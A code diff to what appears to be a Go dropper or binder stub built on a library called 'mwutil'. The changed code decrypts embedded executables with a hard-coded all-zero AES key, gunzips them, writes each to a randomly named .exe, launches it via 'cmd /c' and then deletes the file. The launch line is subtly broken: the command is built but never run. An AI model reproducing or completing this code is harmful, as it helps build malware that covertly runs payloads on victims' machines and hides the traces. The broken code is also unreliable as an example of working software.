@@ -2,52 +2,54 @@ package main
 
 import (
 	"io/ioutil"
+	"math/rand"
+	"os"
 	"os/exec"
+	"strconv"
 	"sync"
 
 	"github.com/Craumix/mwutil"
 )
 
 type exepack struct {
-	data     []byte
-	filename string
+	data []byte
 }
+
+var defaultkey []byte
 
 var executables []exepack
 var wg sync.WaitGroup
 
-var iscompressed bool
-var encryptionkey []byte
-
 func main() {
+	defaultkey = []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
+
 	loadDynamic()
+
 	for _, exe := range executables {
 		go runExepack(exe, "")
 		wg.Add(1)
 	}
+
 	wg.Wait()
 }
 
 func runExepack(pack exepack, path string) {
-	//Encrypting compressed data can be unsafe
-
 	defer wg.Done()
 
 	b := pack.data
 	var err error
-	exepath := path + "/" + pack.filename
+	exepath := path + "/" + strconv.Itoa(rand.Intn(1000000000)) + ".exe"
 
-	if len(encryptionkey) == 32 {
-		b, err = mwutil.AesDecrypt(encryptionkey, b)
-		mwutil.Logif(err)
-	}
-	if iscompressed {
-		b, err = mwutil.GunzipData(b)
-		mwutil.Logif(err)
-	}
+	b, err = mwutil.AesDecrypt(defaultkey, b)
+	mwutil.Logif(err)
+
+	b, err = mwutil.GunzipData(b)
+	mwutil.Logif(err)
 
 	err = ioutil.WriteFile(exepath, b, 0777)
 	mwutil.Logif(err)
 
 	exec.Command("cmd", "/c", exepath)
+
+	err = os.Remove(exepath)
 }
